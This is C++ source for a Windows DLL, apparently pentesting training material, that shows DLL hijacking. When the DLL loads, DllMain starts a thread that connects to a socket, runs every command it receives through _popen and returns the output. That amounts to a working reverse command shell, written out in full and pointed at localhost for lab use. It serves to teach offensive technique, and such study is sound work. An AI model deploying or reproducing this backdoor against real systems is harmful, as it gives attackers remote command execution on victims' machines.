//   Dll Hijacking via Thread Creation 
// Author - Vivek Ramachandran 
//  Learn Pentesting Online --  http://PentesterAcademy.com/topics and http://SecurityTube-Training.com 
// Free Infosec Videos --  http://SecurityTube.net 


#include "pch.h"
#include <windows.h>
#define SHELLCODELEN	2048

#define _WINSOCK_DEPRECATED_NO_WARNINGS

#include <iostream>
#include <winsock2.h>
#include <iphlpapi.h>
#pragma comment(lib, "ws2_32.lib")

// Mutex name for synchronizing access to the flag file
const wchar_t* mutexName = L"DC2DLLMutex";


extern "C" __declspec(dllexport) void ConnectToServer() {

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        std::cerr << "Failed to initialize Winsock" << std::endl;
        return;
    }

    // Create a socket
    SOCKET clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == INVALID_SOCKET) {
        std::cerr << "Failed to create socket" << std::endl;
        WSACleanup();
        return;
    }

    // Set up server address
    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(5000);
    serverAddress.sin_addr.s_addr = inet_addr("127.0.0.1");


    // Connect to the server
    if (connect(clientSocket, reinterpret_cast<SOCKADDR*>(&serverAddress), sizeof(serverAddress)) == SOCKET_ERROR) {
        std::cerr << "Failed to connect to the server" << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return;
    }


    // Send data to the server
    const char* data = "Hello, server!";
    if (send(clientSocket, data, strlen(data), 0) == SOCKET_ERROR) {
        std::cerr << "Failed to send data" << std::endl;
        closesocket(clientSocket);
        WSACleanup();
        return;
    }

    std::cout << "Data sent to the server" << std::endl;

    // Receive response from the server
    char command[1024];
    char buffer[1024];
    while (true) {
        memset(command, 0, sizeof(command));
        if (recv(clientSocket, command, sizeof(command) - 1, 0) == SOCKET_ERROR) {
            std::cerr << "Failed to receive data" << std::endl;
            break;
        }

        if (strcmp(command, "QUIT") == 0) {
            break;
        }

        if (command == nullptr || strnlen(command, 1024) == 0) {
            std::cerr << "No command." << std::endl;
            continue;
        }

        //int size = MultiByteToWideChar(CP_UTF8, 0, command, -1, nullptr, 0);
        //wchar_t* msg = new wchar_t[size];
        //MultiByteToWideChar(CP_UTF8, 0, buffer, -1, msg, size);
        //MessageBox(NULL, msg, L"Popup DLL", MB_OK);

        FILE* commandOutput = _popen(command, "r");
        if (commandOutput == nullptr) {
            std::cerr << "Failed to execute command." << std::endl;
            continue;
        }

        while (fgets(buffer, sizeof(buffer), commandOutput) != nullptr) {

            //int size = MultiByteToWideChar(CP_UTF8, 0, buffer, -1, nullptr, 0);
            //wchar_t* msg = new wchar_t[size];
            //MultiByteToWideChar(CP_UTF8, 0, buffer, -1, msg, size);
            //MessageBox(NULL, msg, L"Popup DLL", MB_OK);

            // Send the output to the socket
            send(clientSocket, buffer, strlen(buffer), 0);
        }

        _pclose(commandOutput);

    }

    // Close the socket and cleanup Winsock
    closesocket(clientSocket);
    WSACleanup();
}


DWORD WINAPI ThreadFunction(LPVOID lpParameter)
{

    HANDLE hMutex = CreateMutexW(nullptr, FALSE, mutexName);

    if (hMutex == nullptr)
    {
        //MessageBox(NULL,            TEXT("nullptr"),            TEXT("DLL Hijack BVS"),            MB_ICONERROR | MB_OK);
        std::cerr << "Failed to create mutex." << std::endl;
        return 0;
    }
    else if (GetLastError() == ERROR_ALREADY_EXISTS) {
        //MessageBox(NULL, TEXT("ERROR ALREADY EXISTS"), TEXT("DLL Hijack BVS"), MB_ICONERROR | MB_OK);
        return 0;
    }
    ConnectToServer();

    //ReleaseMutex(hMutex);
    //CloseHandle(hMutex);

    return 1;
}




BOOL WINAPI
DllMain(HANDLE hDll, DWORD dwReason, LPVOID lpReserved)
{

    HANDLE threadHandle;

    switch (dwReason)
    {
    case DLL_PROCESS_ATTACH:

        // Create a thread and close the handle as we do not want to use it to wait for it 

        threadHandle = CreateThread(NULL, 0, ThreadFunction, NULL, 0, NULL);
        CloseHandle(threadHandle);

        break;

    case DLL_PROCESS_DETACH:
        // Code to run when the DLL is freed
        break;

    case DLL_THREAD_ATTACH:
        // Code to run when a thread is created during the DLL's lifetime
        break;

    case DLL_THREAD_DETACH:
        // Code to run when a thread ends normally.
        break;
    }
    return TRUE;
}